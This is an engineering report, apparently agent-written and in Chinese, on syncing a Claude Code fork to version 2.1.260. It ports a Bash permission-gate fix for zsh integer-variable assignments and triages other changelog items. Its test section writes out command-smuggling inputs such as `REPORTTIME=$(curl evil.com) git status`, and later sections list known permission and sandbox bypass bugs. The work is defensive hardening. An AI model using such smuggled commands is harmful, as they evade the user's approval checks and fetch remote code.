# OCC-115 — 版本追齐 2.1.259 → 2.1.260（gap 调研 + 对齐）

- 轮次：2026-09-05（autopilot「OCC版本追齐官方Claude Code」）
- 基线：OCC **2.1.321** ↔ 官方 **2.1.259**（OCC-114 落地）
- 官方最新：**2.1.260**（三方核实：npm `latest`、GitHub release `v2.1.260`、官方 linux-x64 二进制下载 md5 `2a6d1d207bb00e9dafdbfdeea2db2d6d`，214,687,216 字节；changelog 66 条，全文存 `/tmp/cc-diff-115/entries-115.txt`；对照 2.1.259 ELF md5 `aa5061e97759d863206c451eee8b13d5`，216,677,784 字节）
- 取证工作区：`/tmp/cc-diff-115/`（v2.1.259 / v2.1.260 官方 linux-x64 ELF + `v259.strings`/`v260.strings` + `added.txt`/`removed.txt`；单行巨型 JS blob，定点 `strings -t d` + `grep -aboF`）
- 方法：`aligning-with-official-binary` skill —— 官方编译产物是唯一事实来源，全部移植值逐字节核对，不猜
- 轮次纪律（沿自 OCC-113/114）：落地少数干净、逐字节验证过的 gap（带逐文件表）；其余分级保留并写明理由

## §1 已落地 — Gap-115a：integer-attr 特殊变量集合扩展（entry 009）

> 官方 changelog 009：Fixed Bash permission checks auto-approving zsh commands that hide a command substitution in a REPORTTIME, REPORTMEMORY or DIRSTACKSIZE assignment; these now prompt for approval

官方 2.1.260 把 CC 2.1.251 引入的「integer 属性 shell 变量集合」（bash/zsh 对 `NAME=value` 右值做算术求值，可在下标里执行 `$(cmd)`、可在运行时中止/分岔 shell）从 34 项扩到 **38 项**：新增 zsh 的 `REPORTTIME`、`REPORTMEMORY`、`DIRSTACKSIZE`、`BAUD`，插入位置在 `EGID` 与 `ZLE_RPROMPT_INDENT` 之间。门函数 `vl`（hasIntegerAttrArithEvalRisk）与 `zre`（isSpecialShellVar）相对 2.1.259 **未变**。

二进制取证（2.1.260 ELF，单行巨型 blob 起始偏移 179034184）：

```
WYe=new Set(["RANDOM","SECONDS","LINENO","OPTIND","MAILCHECK","HISTCMD","SRANDOM",
"EPOCHSECONDS","EPOCHREALTIME","COLUMNS","LINES","SHLVL","ERRNO","TMOUT","HISTSIZE",
"SAVEHIST","TRY_BLOCK_ERROR","TRY_BLOCK_INTERRUPT","KEYTIMEOUT","LISTMAX","LOGCHECK",
"PERIOD","FUNCNEST","UID","EUID","GID","EGID","REPORTTIME","REPORTMEMORY",
"DIRSTACKSIZE","BAUD","ZLE_RPROMPT_INDENT","MBEGIN","MEND","PPID","ARGC",
"ZSH_SUBSHELL","TTYIDLE","status"])
```

与 2.1.259 的 `WYe`（= OCC 现集合）逐项比对：差异恰为 +4 新名、位置如上、无删除、无重排。`vl`/`zre` 函数体与 2.1.259 逐字节一致（同 blob 内 `function vl(`、`function zre(` 比对）。因此 OCC 只需移植集合扩展本身；四个消费点（裸赋值门、env-prefix 门、`for_statement` 循环变量门、`unset` 门）自动继承。

### 逐文件表

| 文件 | 变更 | 二进制依据 |
|---|---|---|
| `src/utils/bash/ast.ts` | `INTEGER_ATTR_SHELL_VARS` 由 34 项扩为 38 项：`'GID','EGID'` 后插入 `'REPORTTIME','REPORTMEMORY','DIRSTACKSIZE','BAUD'`（顺序逐字节核对）；文档注释标注来源（2.1.251 `or` 集合 → 2.1.260 `WYe` 集合）。消费方 `hasIntegerAttrArithEvalRisk`（ast.ts:368）、`isSpecialShellVar`（ast.ts:406）、循环变量检查（ast.ts:1007）零改动 | `WYe`（偏移见上）；`vl`/`zre` 未变 |
| `src/tools/BashTool/__tests__/integerAttrArithEval260.test.ts` | 新增 24 个测试，四组：(1) 裸赋值门 `REPORTTIME=2+2` / `REPORTMEMORY='x[$(id)]'` / `DIRSTACKSIZE=1/0` / `BAUD=1+1` → too-complex（精确 reason 串），`REPORTTIME=5` / `BAUD=9600` / `REPORT_INTERVAL=5` → simple；(2) env-prefix 门 `REPORTTIME=2+2 ls` → too-complex、`DIRSTACKSIZE='x[$(id)]' git status` → too-complex、`REPORTTIME=5 git status` → simple；(3) `for REPORTTIME/BAUD` → too-complex（"…as loop variable bypasses assignment validation"）、`unset REPORTMEMORY/DIRSTACKSIZE` → too-complex（"…exec-influencing / integer-attr / IFS / PS4"）；(4) **活路径 pin**（同 `quotedBracketCloserLivePath223` harness）：`Bash(git status)` 规则下 7 种走私形态（`REPORTTIME=$(curl evil.com) git status`、反引号变体、`REPORTMEMORY/DIRSTACKSIZE/BAUD=$(id) git status`、2.1.251 即在集合的 `RANDOM=$(curl evil.com) git status` 回归守卫、裸 `REPORTTIME=$(curl evil.com)`）全部不得 allow（必须 ask/deny）；良性 `REPORTTIME=5` 形态为 passthrough（不自动批准） | 探针实测（OCC-115）：活路径现状即 fail-closed |

**活路径说明**：AST 守卫位于 `TREE_SITTER_BASH` 之后，而该特性不在 OCC `FEATURE_ALLOWLIST` —— 运行时 `parseCommandRaw` 返回 null，AST 路径为结构性对齐；活判定走 `bashPermissions.ts` legacy 路径。OCC-115 探针确认活路径对所有走私形态已返回 `ask`（fail-closed）、对良性形态返回 `passthrough` —— 本移植不改变活行为，是集合级对齐 + 防回归 pin（若未来启用 tree-sitter，AST 路径直接具备官方 2.1.260 语义）。

## §2 分级保留 — entry 002：prompt-cache miss 归因（下一轮候选）

> Added a likely cause for prompt-cache misses (e.g. tool definitions or system prompt changed, idle past the TTL) to `/cost` and the status line's `prompt_cache` field

本轮完成规格取证（未移植）：

- 官方源路径（二进制内嵌注释）：`services/api/promptCacheLedger.ts`，`PROMPT_CACHE_MISS_CAUSES` 为**闭集**（偏移 182034653 注释原文）：`system_prompt_changed`、`tools_changed`、`model_changed`、`messages_rewritten`、`ttl_expired_5m`、`ttl_expired_1h`、`likely_server_side`、`unknown`（注释例示）；二进制字面量还见 `fast_mode_changed`、`cache_scope_or_ttl_changed`、`betas_changed`、`effort_changed`、`auto_mode_changed`、`overage_changed`、`extra_body_changed`、`defer_loading_changed`（cause 集偏移 95413584/95413892 起）
- statusline `/cost` `prompt_cache` JSON 块字段（偏移 91717960/91718272 起）：`warm`、`caching_observed`、`ttl`、`expires_at`、`requests`、`misses`、`expected_rebuilds`、`hit_ratio`、`cache_write_tokens`、`miss_recache_tokens`、`last_miss_at`、`last_miss_cause`、`miss_causes`、`recache_tokens_if_cold`
- **保留原因**：该子系统是一个完整的账本服务（每请求记录 miss 原因、跨 turn 维护命中统计）+ `/cost` 输出扩展 + statusline 字段扩展。OCC 的 API 层/`/cost`/statusline 承载点需要逐点取证（请求参数快照的哪些位被官方用于判因），按 skill「Never invent」，留到下一轮完整取证后移植。

## §3 测试与验证

- 新增 24 个测试：`src/tools/BashTool/__tests__/integerAttrArithEval260.test.ts`（AST 门 14 个 + 活路径 pin 10 个）
- 全量门（`scripts/ci-test.sh`，逐文件进程隔离）：**3500 pass / 16 fail / 12 skip**；基线 3477 / 15 / 12 —— 增量恰为 +24 新测试；15 个失败与基线相同（已知环境性 tmux/live-model e2e），第 16 个 `verify-reachability`（180s 真实模型 e2e）为全量跑时 flaky，事后单独跑 16.27s 通过
- `bun run build` 绿：`dist/cli.js` 28.97 MB（MACRO.VERSION=2.1.322）
- 冒烟绿：`occ --version` → `OCC 2.1.322`；`echo "say PONG" | occ -p` → `PONG`（exit 0，仅 `[claude-code:unrecognized_model] {"model":"glm-5.2"}` 良性警告）；tmux REPL 真实启动 + 交互往返（`say PONG` → `● PONG`，token 计数 0→65638 推进，xhigh effort/auto mode 页脚正常），会话已清理
- 安全审查（issue「安全审查员」要求）：全 diff 审查见下 —— 无后门、无新增外发、无权限/沙箱弱化、无供应链变更。**APPROVE**

### 安全审查记录（全 diff）

- 变更面：`src/utils/bash/ast.ts`（集合 +4 项 + 注释）、`src/tools/BashTool/__tests__/integerAttrArithEval260.test.ts`（新增测试）、`CHANGELOG.md`/`package.json`/本文档（非代码）
- 方向性：集合扩展只可能让权限门**更严**（更多赋值形态被判 too-complex → 不被自动批准），不存在放松路径；`vl`/`zre` 消费逻辑零改动，与官方 2.1.260 逐字节一致
- 无新增网络外发/遥测/文件写出；无依赖变更（`package.json` 仅版本号）；无硬编码密钥；无 `eval`/动态执行引入
- 活路径 pin 测试反向验证：7 种命令替换走私形态在 `Bash(git status)` 放行规则下全部不得 auto-allow（必须 ask/deny），良性形态 passthrough —— 无新增绕过面
- 结论：**APPROVE**（无 CRITICAL/HIGH/MEDIUM 发现）

## §4 OCC 天然 no-op（按设计不追）

| entries | 原因 |
|---|---|
| 003 | `/reload-plugins` 进 headless —— OCC 插件系统裁剪 |
| 004 | `/advisor` 文本形态（desktop/Remote Control/headless）—— OCC 无 desktop/RC 面 |
| 005 | `oidc.scope_on_refresh` —— Claude apps gateway，OCC 无此面 |
| 006 | Claude apps gateway `desktop` policy 新键 —— 同上 |
| 018 | 插件 hook 加载失败后模型切换被锁 —— 插件裁剪 |
| 019 | 组织受管插件 marketplace 不可加载导致模型切换被锁 —— 插件裁剪 |
| 021 | Claude in Chrome 云会话中途 "Not connected" —— OCC Chrome MCP 为 stub 包 |
| 023 | Remote Control 接受非法模型名 —— OCC 无 RC |
| 033 | URL marketplace 插件安装（宿主存目录）—— 插件裁剪 |
| 034 | 发布 artifact 多开浏览器标签 —— OCC 无 Artifact 云 |
| 035 | Artifact 首调 "Invalid tool parameters" —— 同上 |
| 040 | **Reverted 2.1.259 把 `Read()` deny 规则应用到 Bash 参数** —— OCC 从未移植该 2.1.259 变更（当时即列为 §6 待取证项），本条官方回退使其正式关闭：OCC-114 §6 item 007 撤销，无需任何动作（已用 2.1.260 二进制核实回退生效） |
| 043 | Claude apps gateway 刷新失败日志点名步骤 —— gateway 裁剪 |
| 044 | `-p`/SDK 空闲 CPU 优化 —— 无可移植点（官方内部调度） |
| 045 | Claude apps gateway Bedrock CountTokens —— gateway 裁剪 |
| 048 | `/ultrareview` 等待 30→45 分钟 —— OCC 无 ultrareview 云评审面 |
| 054 | Claude in Chrome 跟随组织管理设置 —— Chrome MCP stub |
| 055 | gateway `orgPluginSettings` 列表形态 —— gateway 裁剪 |
| 056 | gateway `desktop` policy 嵌套字段拼错拒绝启动 —— gateway 裁剪 |
| 058 | 自托管 runner `--kill-session-after-min` 语义 —— OCC 无此面 |
| 060-066 | [VSCode] ×7 —— OCC 无 VSCode 扩展 |

## §5 分级保留 — 安全类（下一轮 P0 候选）

- **007（P0）** 路径含括号的 `Edit`/`Write`/`Read` 权限规则被当作无效丢弃或被 Bash 沙箱忽略，导致「只读」目录可写 —— OCC 的规则编译/沙箱路径转换需逐点取证官方新解析
- **008（P0）** 一条含不可编译正则（如未闭合 `[`）的文件权限规则使所有文件编辑报 `Invalid regular expression`；现在该 deny 规则守卫其字面路径 —— OCC 规则编译器行为需取证 + 复现
- **039（P1）** Glob/Grep 搜索路径的磁盘探测移到权限判定之后（与 Read 一致）—— 信息泄露面：未授权时不应触发路径存在性探测；OCC Glob/Grep 权限顺序需取证
- **承自 OCC-114 §6**（未变，逐点取证待排期）：046（auto 模式复合命令内 `permissions.ask` 跳过）、054（`< file` 重定向与 `tac`/`egrep` 类读取命令绕过 `Read()`/`Edit()` deny）、070（zsh `[[ ]]` 解析差异残留形态核查）、052（非 JSONL 灌入 `-p --input-format stream-json` 无界内存）、051（`.mcp.json` FIFO/设备符号链接挂死）、091（项目 `defaultMode: "bypassPermissions"` 应忽略）、005（2.1.257 auto 模式 Containment Escape 规则）、082（MCP 连接/OAuth 日志脱敏）、093（`--add-dir` 网络路径）、047（插件组件符号链接逃逸，核对 OCC 自建 loader）
- OCC-114 §6 原 item 007（Bash `Read()` deny 规则未覆盖）**已因官方回退（本轮 entry 040）关闭**

## §6 分级保留 — 其余（需逐点取证，不猜）

- **002** → 见 §2（prompt-cache miss 归因，下一轮候选）
- **001** `/diff` 全屏差异面板 —— OCC 全屏模式渲染取证
- **010** Bedrock 企业根 CA 仅在系统证书库时 "unable to get local issuer certificate" —— OCC Bedrock 路径 TLS 链取证
- **011** macOS `blockReadsOutsideWorkingDirectories` 隐藏 git config / worktree 子代理检出 —— OCC 无该受管键，核对承载
- **012** claude.ai Enterprise/Team 用户残留 API key 时受管设置不加载 —— OCC 认证/受管设置面裁剪
- **013** `/status` 同时列 claude.ai 账号与 API key 为生效 —— OCC `/status` 凭据展示取证
- **014** 受管 `skillOverrides` 别名键不生效 + `Skill(name)` deny 不覆盖 `<dir>:name` —— OCC 受管设置/技能权限面取证
- **015** `model: fable` agent 忽略 `ANTHROPIC_DEFAULT_FABLE_MODEL` 的 `[1m]` 标签 —— OCC frontmatter model 解析取证
- **016** `/model` 选择器对可用组织不显示 Fable 5.1 —— OCC picker 组织门取证
- **017** Fable 5.1 提示缓存未覆盖工具结果后附着的上下文 —— OCC API 层缓存断点取证
- **020** SDK 提供的 MCP 服务器首 turn 缺失 —— OCC `-p` MCP 初始化时序取证
- **022** 旗帜/连字 emoji/带音字母跨换行被切断 + 末两列残字（改显 `…`）—— OCC 换行渲染取证
- **024** `/rewind` 检查点备份缺失仍报成功 —— OCC rewind 文件系统校验取证
- **025** `/rewind` 遗留过期文件读跟踪（"File unchanged since last read" 假桩 + 外部编辑后全文件重注入）—— OCC 文件状态缓存与 rewind 交互取证
- **026** `-p --resume`/`--continue` 在 worktree git 元数据丢失后每次重试都失败 —— OCC resume/worktree 取证
- **027** 经 SendMessage 恢复他代理的 subagent 收不到完成唤醒 —— OCC agent 团队面裁剪，核对承载
- **028** agent teams 进程内队友 transcript 在长 API 重试等待中丢消息 —— 同上
- **029** 转入后台的会话在 ListAgents 出现两次（幻影交互孪生）—— 同上
- **030** 多会话共享项目目录时 "task output swap refused" —— OCC 后台任务输出交换取证
- **031** 全屏模式 Ctrl+Z 后 shell 留在备用屏 —— OCC 全屏/信号处理取证
- **032** 长上下文压缩进行中 Workflow 子代理被误判 stalled 重启 —— OCC workflow 引擎停滞判定取证
- **036** 运行技能/斜杠命令时 IDE 行选择被丢弃 —— OCC 无 IDE 集成面，核对是否留痕
- **037** GitLab 嵌套子组仓库检测 —— OCC 仓库检测取证
- **038** GitLab 仓库内 `owner/repo#123` 渲染仍链向 github —— OCC issue 链接渲染取证
- **041** Workflow `agent({schema})` 前置拒绝永不可满足的 JSON Schema + retry-cap 错误带上最后一次校验失败 —— OCC workflow schema 校验取证
- **042** 删除带未推送提交 worktree 的后台会话：消息点名分支与提交数，二次删除丢弃 worktree —— OCC daemon 会话删除取证
- **046** `Edit(C:\dir\(name)\**)` 类规则的设置报错改进（`\(` 被读作转义括号）—— OCC 规则解析报错取证
- **047** 1M 上下文模型自动压缩（Opus/Fable 在 1M 前压缩；超大上下文恢复压缩不再 10 分钟超时）—— OCC 压缩阈值取证
- **049** Fable 5.1 `/effort` 变更不再失效提示缓存 —— OCC effort/缓存键取证
- **050** 捆绑 `claude-api` 技能样例更新为当前代模型 ID —— OCC 技能 .md 为 1 字节 stub（裁剪），无面
- **051** 全屏模式 `ctrl+l`/`cmd+k` 改为清屏（像终端 `clear`）—— OCC 全屏键位取证
- **052** 尾随文本的规则（`Bash(ls) x`）从静默忽略改为报无效设置 —— OCC 规则校验取证
- **053** 受管 CLAUDE.md 不再触发安全批准对话框（hooks/shell/sandbox/env 仍要批准）—— OCC 受管设置面裁剪
- **057** `!` bash 模式命令在严格沙箱模式下也在沙箱外运行 —— OCC 沙箱模式语义取证
- **059** 移除 subagent 后台命令的 1 小时上限 —— OCC 后台命令计时器取证

## §7 发版

- 版本：**2.1.322**（OCC 2.1.3xx ↔ 官方 2.1.2xx；2.1.321 ↔ 2.1.259，2.1.322 ↔ 追齐 2.1.260）
- CHANGELOG：`Caught up with upstream Claude Code through 2.1.260` + 用户可见变更
- 流程（固化）：合入 main → tag `v2.1.322` → push 触发 `.github/workflows/publish.yml`（build → npm publish → `gh release create "$GITHUB_REF_NAME" --generate-notes --title "$GITHUB_REF_NAME"`，`permissions: contents: write`、`if: success()`、幂等 `gh release view` 探测、无 `--target`）
- 发版后校验：`gh api repos/cnwenf/occ/releases` 计数 == `/tags` 计数；`comm -23 <(tags) <(releases)` 为空；GitHub 残留分支清理
